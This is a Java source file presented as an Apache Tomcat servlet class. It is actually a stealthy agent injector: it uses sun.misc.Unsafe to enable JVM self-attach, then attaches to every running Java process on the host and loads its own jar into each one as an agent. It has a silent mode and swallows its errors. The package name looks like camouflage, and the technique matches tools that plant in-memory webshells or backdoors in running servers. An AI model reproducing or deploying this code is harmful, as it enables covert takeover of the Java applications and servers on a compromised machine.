package org.apache.catalina.servlets;

import java.lang.reflect.Field;
import java.util.List;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import sun.misc.Unsafe;

public class Attach {

    public static void main(String[] args) throws Exception {
        String agentArgs = "";
        if (args.length > 0) {
            agentArgs = args[0];
        }
        att(agentArgs);
    }

    private static void enableAttachSelf() {
        try {
            Unsafe unsafe = null;
            try {
                Field field1 = Unsafe.class.getDeclaredField("theUnsafe");
                field1.setAccessible(true);
                unsafe = (Unsafe)field1.get(null);
            } catch (Exception e) {
                throw new AssertionError(e);
            }
            Class<?> cls = Class.forName("sun.tools.attach.HotSpotVirtualMachine");
            Field field = cls.getDeclaredField("ALLOW_ATTACH_SELF");
            long fieldAddress = unsafe.staticFieldOffset(field);
            unsafe.putBoolean(cls, fieldAddress, true);
        } catch (Throwable throwable) {}
    }

    public static void att(String agentArgs) throws Exception {
        boolean print = true;
        enableAttachSelf();
        System.setProperty("jdk.attach.allowAttachSelf", "true");
        String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        try {
            agentFile = java.net.URLDecoder.decode(agentFile, "UTF-8");
        } catch (Exception ignored) {}
        agentFile = new java.io.File(agentFile).getAbsolutePath();
        if (agentArgs.equals("ignored")){
            print = false;
        } else {
            agentArgs = agentFile + "^" + agentArgs;
        }
        List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : vmList) {
            String name = vmd.displayName();
            try {
                if (name.length() > 0 && !agentFile.contains(name)) {
                    if (print){
                        System.out.println("-------------------");
                        System.out.println("name >>> " + vmd.displayName());
                        System.out.println("id >>> " + vmd.id());
                    }
                    VirtualMachine vm = VirtualMachine.attach(vmd);
                    vm.loadAgent(agentFile, agentArgs);
                    vm.detach();
                    if (print){
                        System.out.println("success");
                    }
                }
            } catch (Exception ignored) {
                if (print){
                    System.out.println("fail");
                }
            }
        }
    }
}
